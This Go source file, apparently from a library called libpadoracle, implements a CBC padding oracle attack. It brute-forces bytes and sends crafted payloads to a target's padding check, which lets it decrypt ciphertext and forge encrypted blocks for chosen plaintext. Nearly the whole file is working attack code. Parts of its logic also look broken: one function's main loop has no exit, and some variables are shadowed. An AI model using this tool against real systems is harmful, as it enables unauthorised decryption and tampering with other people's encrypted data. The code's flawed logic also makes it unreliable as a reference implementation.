package libpadoracle

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"sync"

	"unicode"

	"github.com/gosuri/uiprogress"
)

func GetRangeDataSafe(pre []byte) []byte {
	rangeData := []byte{}
	rangeData = append(rangeData, pre...)
	for _, v := range []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHJIKLMNOPQRSTUVWXYZ1234567890") {
		if bytes.Contains(rangeData, []byte{v}) {
			continue
		}
		rangeData = append(rangeData, v)
	}
	for i := byte(2); i <= 253; i++ {
		if bytes.Contains(rangeData, []byte{i}) {
			continue
		}
		rangeData = append(rangeData, i)
	}
	// Deprioritise possible FPs
	rangeData = append(rangeData, []byte{0xff, 0xfe, 0x01, 0x00}...)
	// rand.Seed(time.Now().UnixNano())
	// rand.Shuffle(len(rangeData), func(i, j int) { rangeData[i], rangeData[j] = rangeData[j], rangeData[i] })
	return rangeData
}

// PerByteOperations performs the actual math on each byte of the CipherText
func PadOperations(wg *sync.WaitGroup, cfg *Config, cipherText []byte, decipherChan chan Data) {
	defer func() {
		close(decipherChan)
		wg.Done()
	}()

	threadCh := make(chan struct{}, cfg.Threads)
	wg2 := sync.WaitGroup{}
	if cfg.IV != nil { // IV was supplied by the user - let's prepend to the Decoded Ciphertext
		cipherText = append(cfg.IV, cipherText...)
	}
	Blocks := ChunkBytes(cipherText, cfg.BlockSize)
	cfg.NumBlocks = len(Blocks)
	wg.Add(1)
	go WriteOutput(wg, decipherChan, cfg)

	// fmt.Println(Blocks)
	if lastBlockLen := len(Blocks[len(Blocks)-1]); lastBlockLen != cfg.BlockSize {
		err := fmt.Errorf("Invalid Block Size at Block #%d (%v bytes - should be %d)", len(Blocks), lastBlockLen, cfg.BlockSize)
		panic(err)
	}
	endBlock := len(Blocks)
	fmt.Printf("Total Blocks: [%v]\n", len(Blocks))
	startBlock := 1
	for blockNum, blockData := range Blocks[startBlock:endBlock] {
		wg2.Add(1)
		go PerBlockOperations(&wg2, *cfg, threadCh, decipherChan, blockNum+startBlock, blockData, Blocks[blockNum+startBlock-1])
	}

	wg2.Wait()
}

// PerBlockOperations performs the actual math on each byte of the CipherText
func PerBlockOperations(wg *sync.WaitGroup, cfg Config, threadCh chan struct{}, decipherChan chan Data, blockNum int, blockData []byte, iv []byte) {
	// TODO stuff here
	defer func() {
		wg.Done()
	}()
	var strData string
	var outData string
	bar := uiprogress.AddBar(cfg.BlockSize).AppendCompleted().PrependElapsed()
	bar.Empty = ' '
	bar.PrependFunc(func(b *uiprogress.Bar) string {
		return strData
	})
	bar.AppendFunc(func(b *uiprogress.Bar) string {
		return outData
	})
	rangeData := GetRangeDataSafe([]byte{}) //slice of 'candidate' bytes
	if blockNum == cfg.NumBlocks-1 {
		pads := []byte{}
		for p := byte(3); p < byte(cfg.BlockSize); p++ {
			pads = append(pads, p)
		}
		rangeData = GetRangeDataSafe(pads)
	}
	blockDecipherChan := make(chan []byte, 1)
	returnData := Data{}
	decipheredBlockBytes := []byte{}
	wg2 := sync.WaitGroup{}
	var byteNum int
	var nextByte byte

	for {
		for byteNum, _ := range blockData { // Iterate over each byte
			continueChan := make(chan bool, 1)

			wg2.Add(1)
			// var found bool
			// Iterate through each possible byte value until padding error goes away
			for _, i := range rangeData {
				var found bool = false
				strData = fmt.Sprintf("Block [%v]\t[%v%v%v]", blockNum, b.Sprintf("%x", blockData[:len(blockData)-1-byteNum]), y.Sprintf("%02x", i), g.Sprintf("%v", hex.EncodeToString(decipheredBlockBytes)))
				threadCh <- struct{}{}
				if blockNum == cfg.NumBlocks-1 && byteNum == 0 { // Edge case for the VERY LAST byte of ciphertext;
					// 	// this one will ALWAYS allow 0x01 to be valid (as 1 byte of padding in the final block is always a valid value)
					// 	// Additionally, there's a 1/256 chance that 0x02 will be valid
					// 	// The probability of each successive value is exponential, so we can probably assume it's not likely
					found = PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes, continueChan)

				} else {
					go PerByteOperations(&wg2, threadCh, blockDecipherChan, cfg, i, byteNum, blockNum, blockData, iv, decipheredBlockBytes, continueChan)
				}
				if found {
					break
				}
			}
			retBytes := <-blockDecipherChan // should be []byte{input, output}
			foundCipherByte := retBytes[0]
			nextByte := retBytes[1]
			if cfg.AsciiMode && blockNum != 0 { // this should prevent it crapping out when it hits the IV block (which is gouing to be garbage)
				if !unicode.IsPrint(rune(nextByte)) {
					rangeData = bytes.ReplaceAll(rangeData, []byte{foundCipherByte}, []byte{})
					continue
				}
				break
			}
		}
		strData = fmt.Sprintf("Block [%v]\t[%v%v%v]", blockNum, b.Sprintf("%x", blockData[:len(blockData)-1-byteNum]), r.Sprintf("%02x", nextByte), g.Sprintf("%v", hex.EncodeToString(decipheredBlockBytes)))
		decipheredBlockBytes = append([]byte{nextByte}, decipheredBlockBytes...)
		bar.Incr()
		wg2.Wait()
	}
	returnData.BlockNumber = blockNum
	returnData.EncryptedBlockData = blockData
	returnData.DecipheredBlockData = decipheredBlockBytes
	if blockNum == cfg.NumBlocks-1 { // Last block - unpad before saving cleartext
		returnData.UnpaddedCleartext = string(Unpad(decipheredBlockBytes))
	} else {
		returnData.UnpaddedCleartext = string(decipheredBlockBytes)
	}
	outData = fmt.Sprintf("Decrypted [%v]\n╰> Original Ciphertext:\t[%v]\n╰> Decrypted (Hex):\t[%v]\n╰> Cleartext:\t\t[%v]\n", r.Sprintf("Block %d", returnData.BlockNumber), b.Sprintf(hex.EncodeToString(returnData.EncryptedBlockData)), g.Sprintf(hex.EncodeToString(returnData.DecipheredBlockData)), gb.Sprintf(returnData.UnpaddedCleartext))

	decipherChan <- returnData
}

// PerByteOperations performs the actual math on each byte of the CipherText
func PerByteOperations(wg *sync.WaitGroup, threadCh chan struct{}, blockDecipherChan chan []byte, cfg Config, bruteForceByteValue byte, byteNum int, blockNum int, blockData []byte, IV []byte, decipheredBlockBytes []byte, continueChan chan bool) bool {
	defer func() {
		<-threadCh // Release a thread once we're done with this goroutine
	}()
	select {
	case <-continueChan:
		return false
	default:
		var RawOracleData []byte
		// Math here - all the XORing and building of weird padding happens in these routines
		padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize)
		searchBlock := BuildSearchBlock(decipheredBlockBytes, bruteForceByteValue, cfg.BlockSize)
		tmp := XORBytes(searchBlock, IV)
		oracleIvBlock := XORBytes(tmp, padBlock)

		RawOracleData = BuildRawOraclePayload(oracleIvBlock, blockData)
		// padBlock := BuildPaddedBlock(IV, blockData, bruteForceByteValue, cfg.blockSize)

		encodedPayload := cfg.Pad.EncodePayload(RawOracleData)
		cfg.MetricsChan <- 1
		if cfg.Pad.CallOracle(encodedPayload) { // this one didn't return a pad error - we've probably decrypted it!
			defer wg.Done()
			continueChan <- true
			close(continueChan)
			blockDecipherChan <- []byte{byte(bruteForceByteValue), byte(bruteForceByteValue)}
			if byteNum == cfg.BlockSize {
				close(blockDecipherChan)
			}
			return true
		}
		return false // This is to aid with detection of the final ciphertext's pad byte
	}
}

func PadOperationsEncrypt(wg *sync.WaitGroup, cfg *Config, plainText []byte) {
	defer func() {
		wg.Done()
	}()
	bar := uiprogress.AddBar(cfg.BlockSize).AppendCompleted().PrependElapsed()
	bar.Empty = ' '
	var strData string = ""
	var outData string = ""
	bar.PrependFunc(func(b *uiprogress.Bar) string {
		return strData
	})
	bar.AppendFunc(func(b *uiprogress.Bar) string {
		return outData
	})
	// IV was supplied by the user - let's prepend to the Plaintext
	if cfg.IV != nil {
		plainText = append(cfg.IV, plainText...)
	}
	// So at this point plaintext should look like:
	// [Block0: IV][Block1 - Block n-1: Target Plaintext to be "encrypted"]
	// Chunk up the PKCS7-padded plaintext into BS-sized blocks
	tmp, err := PKCS7(plainText, cfg.BlockSize)
	Check(err)
	plainTextChunks := ChunkBytes(tmp, cfg.BlockSize)
	// New slice to store our resulting ciphertext in; it needs space for the iv and final ciphertext block
	cipherTextChunks := make([][]byte, len(plainTextChunks)+1)

	// We need a 'random' last block. It doesn't actually have to be random so I've filled it with A's
	cipherTextChunks[len(cipherTextChunks)-1] = GenerateFullSlice(0x41, cfg.BlockSize)
	// Reverse the order of the search
	threadCh := make(chan struct{}, cfg.Threads)
	var nextCt []byte
	for i := len(plainTextChunks) - 1; i >= 0; i-- {
		// Grab the next ciphertext and target plaintext blocks from the array
		ct := cipherTextChunks[i+1]
		nextCt, outData = PerBlockOperationsEncrypt(*cfg, i, ct, plainTextChunks[i], threadCh, bar)
		// prepend the next ciphertext chunk to the list for processing
		cipherTextChunks[i] = nextCt
	}
	bar.Incr()

	outBytes := []byte{}
	for _, b := range cipherTextChunks {
		outBytes = append(outBytes, b...)
	}
	fmt.Println("Here is your ciphertext; supply this to the app:\n", cfg.Pad.EncodePayload(outBytes))
}

// Encrypting works a little differently, and is dependent on the previous block being calculated, unlike decrypting :(. Paralleling this operation is likely not possible?
func PerBlockOperationsEncrypt(cfg Config, blockNum int, cipherText []byte, plaintText []byte, threadCh chan struct{}, bar *uiprogress.Bar) (iv []byte, outData string) {
	// threadCh := make(chan struct{}, cfg.Threads)
	wg := sync.WaitGroup{}
	var strData string
	rangeData := GetRangeDataSafe([]byte{}) //slice of 'candidate' bytes
	if blockNum == cfg.NumBlocks-1 {
		pads := []byte{}
		for p := byte(3); p < byte(cfg.BlockSize); p++ {
			pads = append(pads, p)
		}
		rangeData = GetRangeDataSafe(pads)
	}
	bar.PrependFunc(func(b *uiprogress.Bar) string {
		return strData
	})
	decipheredBlockBytes := GenerateFullSlice(0x00, cfg.BlockSize)
	outchan := make(chan []byte, 1)
	// Iterate through each byte in the block
	for byteNum, _ := range plaintText { // Iterate over each byte
		// Iterate over each possible byte value to determine which one doesn't cause a padding error
		// The actual math and stuff happens in the perbyteoperations function below
		continueChan := make(chan bool, 1)
		wg.Add(1)
		for _, i := range rangeData {
			strData = fmt.Sprintf("Block [%v]\t[%v%v%v]", blockNum, b.Sprintf("%x", cipherText[:len(cipherText)-1-byteNum]), y.Sprintf("%02x", i), g.Sprintf("%v", hex.EncodeToString(decipheredBlockBytes)))

			threadCh <- struct{}{}
			go PerByteOperationsEncrypt(&wg, threadCh, outchan, cfg, i, byteNum, blockNum, cipherText, decipheredBlockBytes, continueChan)
		}
		decipheredBlockBytes = <-outchan
		strData = fmt.Sprintf("Block [%v]\t[%v%v%v]", blockNum, b.Sprintf("%x", cipherText[:len(cipherText)-1-byteNum]), r.Sprintf("%02x", decipheredBlockBytes[len(cipherText)-1-byteNum]), g.Sprintf("%v", hex.EncodeToString(decipheredBlockBytes[len(cipherText)-byteNum:])))
		bar.Incr()
		wg.Wait()

	}

	iv = XORBytes(decipheredBlockBytes, GenerateFullSlice(0x11, cfg.BlockSize))
	iv = XORBytes(iv, plaintText)
	outData = fmt.Sprintf("Encrypted [%v]\n╰> Block n+1:\t[%v]\n╰> Generated block n (IV) (Hex):\t[%v]\n╰> Cleartext for Block n+1:\t\t[%v]\n", r.Sprintf("Block %d", blockNum), b.Sprintf(hex.EncodeToString(cipherText)), g.Sprintf(hex.EncodeToString(iv)), gb.Sprintf(string(plaintText)))
	return iv, outData
}

// PerByteOperations performs the actual math on each byte of the CipherText
func PerByteOperationsEncrypt(wg *sync.WaitGroup, threadCh chan struct{}, outchan chan []byte, cfg Config, bruteForceByteValue byte, byteNum int, blockNum int, cipherText []byte, decipheredBlockBytes []byte, continueChan chan bool) {
	defer func() {
		<-threadCh // Release a thread once we're done with this goroutine
	}()
	select {
	case _, ok := <-continueChan:
		if !ok {
			return
		}
		return
	default:
		// Ok here's the bit where we build our attack payload.
		// It happens in ~3 stages; a padding block is constructed
		padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize) // gives us [0x00, 0x00, 0x00,..,0x01] -> [0xf, 0xf, 0xf, ..., 0xf]

		// Searchblock produces a front-padded with 0x00, the target byte we're flipping; and then the remainder of the previously determined bytes
		searchBlock := append(GenerateFullSlice(0x00, cfg.BlockSize-byteNum-1), byte(bruteForceByteValue))
		searchBlock = append(searchBlock, decipheredBlockBytes[len(decipheredBlockBytes)-byteNum:]...)

		// gives us the modified IV block, mutating the last byte backwards
		// nextPadBlock := BuildPaddingBlock(byteNum+1, cfg.BlockSize) gives us [0x00,...,0x01] -> [0x10, ..., 0x10]
		nextPadBlock := append(GenerateFullSlice(0x00, cfg.BlockSize-byteNum-1), GenerateFullSlice(byte(byteNum+2), byteNum+1)...)

		// Appends the ciphertext block to the generated IV
		RawOracleData := BuildRawOraclePayload(searchBlock, cipherText)

		// Sends to the client for processing / Encoding
		encodedPayload := cfg.Pad.EncodePayload(RawOracleData)

		cfg.MetricsChan <- 1

		// Check if the generated block is padded correctly!
		if cfg.Pad.CallOracle(encodedPayload) { // this one didn't return a pad error - we've probably found our pad byte!
			defer wg.Done()
			// Signal that we're done with this channel and that other goroutines should quit
			// fmt.Println("Here")
			continueChan <- true
			close(continueChan)
			// fmt.Println("NowHere")

			decipheredBlockBytes[cfg.BlockSize-byteNum-1] = byte(bruteForceByteValue) // prepend the found byte
			tmp := XORBytes(decipheredBlockBytes, padBlock)

			if byteNum != cfg.BlockSize {
				decipheredBlockBytes = XORBytes(tmp, nextPadBlock)
			}

			outchan <- decipheredBlockBytes
			if byteNum == cfg.BlockSize {
				close(outchan)
			}
			// fmt.Println("NowIHere")
			return
		}
		return // This is to aid with detection of the final ciphertext's pad byte
	}
}
